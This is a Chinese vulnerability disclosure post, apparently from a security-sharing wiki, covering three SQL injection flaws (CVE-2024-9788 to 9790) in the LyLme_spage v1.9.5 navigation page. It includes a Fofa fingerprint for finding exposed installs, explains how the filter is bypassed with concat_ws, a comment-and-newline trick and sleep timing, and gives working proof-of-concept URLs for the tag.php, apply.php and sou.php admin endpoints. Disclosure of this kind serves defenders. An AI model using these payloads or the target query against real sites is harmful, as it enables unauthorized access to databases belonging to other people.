
# 安全团队贡献平台

导航切换

* [首页](/)
* 所有信息
  + [所有情报](/list/all/)
  + [推荐专区](/list/recommend/)
  + [综合情报](/list/wiki/)
  + [用户提交](/list/userpost/)
  + [高校情报](/list/school/)
* [排行榜](/user/)
* [礼品中心](/gift/)
* [搜索](/search/)
* [公告](/announcements/)
* [IPwhois新功能](/ip/)
* [WooYun drops新功能](/wooyun/)
* 更多
  + [edudata平台](https://wiki.shikangsi.com/cas/jump/edudata)
  + [零组知识库-006应急响应目录](https://wiki.shikangsi.com/post/3629/)
  + [零组知识库-007内网渗透目录](https://wiki.shikangsi.com/post/3631/)
  + [零组知识库-009安全技术目录](https://wiki.shikangsi.com/post/3632/)
  + [零组知识库-010域渗透目录](https://wiki.shikangsi.com/post/3633/)
  + [零组知识库-011运维与二进制安全目录](https://wiki.shikangsi.com/post/3634/)
  + [XSS平台](https://wiki.shikangsi.com/cas/jump/xss)
  + [edusrc数据分析](http://data.shikangsi.com/)
  + [友情链接](https://wiki.shikangsi.com/links/)
  + [wiki社区](https://wiki.shikangsi.com/zone/)

[提交贡献](/add/)

[登录](/login/)

[注册](/register/)

# 【原创】（CVE-2024-9788）LyLme\_spage v1.9.5 SQL注入漏洞

---

分享
### 当前为私密分享，无需登录即可查看。

---

| 时间 | 作者 | 可见性 | 等级 | Rank |
| --- | --- | --- | --- | --- |
|| 2024-09-26 12:30:44 | [Jing](/profile/1280/) | 公开的 | 高危 | 3 |
| --- | --- | --- | --- | --- |

CVE-2024-9788
CVE-2024-9789
CVE-2024-9790
Created: 10/10/2024 08:47 AM
Changes: 10/10/2024 08:47 AM (55)
Submitter: Jing@wiki

---

# 漏洞描述

```
 - Summary

```

LyLme\_spage 是一个开源的导航页项目，旨在为用户提供便捷的网页导航服务。项目地址：[LyLme/lylme\_spage: 六零导航页 (github.com)](https://github.com/LyLme/lylme_spage)

```
 - LyLme_spage is an open-source navigation page project designed to provide users with convenient web navigation services. Project address: LyLme/lylme_spage: Liuling Navigation Page.

```

LyLme\_spage v1.9.5 版本中存在 多个SQL 注入漏洞。攻击者可以通过构造特定的 SQL 语句，绕过输入过滤，执行未授权的数据库查询操作。由于 group\_concat 函数被过滤，攻击者利用 concat\_ws 函数进行数据查询。此外，通过修改 LIMIT 参数，攻击者可以遍历数据库中的表名和数据。攻击者还可以通过 sleep 函数实现延时效果，进一步探测数据库结构。

```
 - However, version 1.9.5 of the project contains multiple SQL injection vulnerabilities. Attackers can exploit these vulnerabilities by constructing specific SQL statements to bypass input filtering and execute unauthorized database queries. In version 1.9.5 of LyLme_spage, multiple SQL injection vulnerabilities exist. Attackers can construct specific SQL statements to bypass input filtering and perform unauthorized database queries.
 - Since the group_concat function is filtered, attackers use the concat_ws function for data queries. Additionally, by modifying the LIMIT parameter, attackers can iterate through table names and data in the database. Attackers can also use the sleep function to achieve a delay effect, further probing the database structure.

```

SQL 注入点 1 位于 /admin/tag.php，通过修改 id 参数构造注入语句。

```
 - SQL injection point 1 is located at /admin/tag.php, where an injection statement can be constructed by modifying the id parameter.
 - SQL injection point 2 is located at /admin/apply.php, where an injection statement can also be constructed by modifying the id parameter.
 - SQL injection point 3 is located at /admin/sou.php, where an injection statement can be constructed by modifying the id parameter.

```
# 资产测绘

```
 - Fofa query keyword

```

`"LyLme_spage" && icon_hash="-282504889"`

![null](/media/images/2024/09/26/03aa1e5f-6f11-4a1e-aa4d-2e6e70cd4e32-3Wh3gBjD.png)

# 审计过程

```
 - Discovery process

```

![null](/media/images/2024/09/26/77a59aaf-76ef-499c-abae-d0aa95bff335-qYsR8ntl.png)

如图，虽然做了许多对于SQL注入的过滤，但是任然可以绕过。

```
 - As shown in the figure, although many filters for SQL injection have been implemented, they can still be bypassed.

```

![null](/media/images/2024/09/26/2c58c901-b3be-4f98-bfc3-b5b8bba40a1f-JcG8L8OF.png)

正常被过滤页面

```
 - Normally Filtered Page

```

![null](/media/images/2024/09/26/ba3bf33d-4fcb-4100-a7c5-f95e10238925-xs539lqe.png)

Payload:

`-7'+unioN+select%23xxxx%0a1,database(),user(),4,(select%23xxxx%0aCONCAT_WS(',',TABLE_NAME)+test+from+information_schema.tables+where+table_schema='liuzero'+LIMIT+2,1)--+`

通过替换limit中 2 遍历表名，遍历数据同原理，主要group\_concat被过滤，但是concat\_ws可绕过select通过%23xxxx%0a绕过

```
 - By replacing the 2 in LIMIT, table names can be iterated through. The principle for iterating through data is the same. The main point is that group_concat is filtered, but concat_ws can be bypassed. Select can be bypassed through %23xxxx%0a.

```

![null](/media/images/2024/09/26/a87e6f00-1b7c-4a95-b793-67b4ab740a1f-IehWFN93.png)

当然也可以达到延时效果

```
 - Of course, a delay effect can also be achieved.

```

Payload：

7'+and+`sleep`(5)--+

![null](/media/images/2024/09/26/aaa66ce5-6c67-4c97-ae6c-9ac88d4c7f29-HaFKCf5q.png)

# POC

## SQL注入点1：/admin/tag.php

```
 - SQL Injection Point 1 POC

```

`/admin/tag.php?set=edit&id=-7'+unioN+select%23xxxx%0a1,database(),user(),4,(select%23xxxx%0aCONCAT_WS(',',TABLE_NAME)+test+from+information_schema.tables+where+table_schema='liuzero'+LIMIT+2,1)--`

![null](/media/images/2024/09/26/8efd252f-c416-4dd6-90f5-2051a63de620-ePn02NkZ.png)

![null](/media/images/2024/09/26/ef1e894a-e2de-464a-ad6c-3fc8e5698dc6-cnPFzeon.png)

## SQL注入点2：/admin/apply.php

```
 - SQL Injection Point 2 POC

```

`/admin/apply.php?set=edit&id=-1'+unioN+select%23xxxx%0a1,database(),(select%23xxxx%0aCONCAT_WS(',',TABLE_NAME)+test+from+information_schema.tables+where+table_schema='liuzero'+LIMIT+1,1),4,5,6,7,8--+`

![null](/media/images/2024/09/26/380daf63-4d9c-4d4f-b038-821060abb26d-taIp5ULA.png)

![null](/media/images/2024/09/26/1219e434-ab14-4339-9524-0d0afe102b60-7qhuPxm3.png)

## SQL注入点3 ：/admin/sou.php

```
 - SQL Injection Point 3 POC

```

`/admin/sou.php?set=edit&id=-1'+unioN+select%23xxxx%0a1,database(),(select%23xxxx%0aCONCAT_WS(',',TABLE_NAME)+test+from+information_schema.tables+where+table_schema='liuzero'+LIMIT+1,1),4,5,6,7,8,9,10--+`

![null](/media/images/2024/09/26/8b1152b0-b7c3-406e-8a3b-a8eb0426a93e-FFXZCDZZ.png)

![null](/media/images/2024/09/26/2cfc7e58-56f5-4849-8c16-83f79462264d-Ii0NNIBP.png)

---

审核评价： 没有任何评价...

2014-2022 © 联系邮箱：admin@sg95.cn    [鄂ICP备15020128号-4](https://beian.miit.gov.cn)

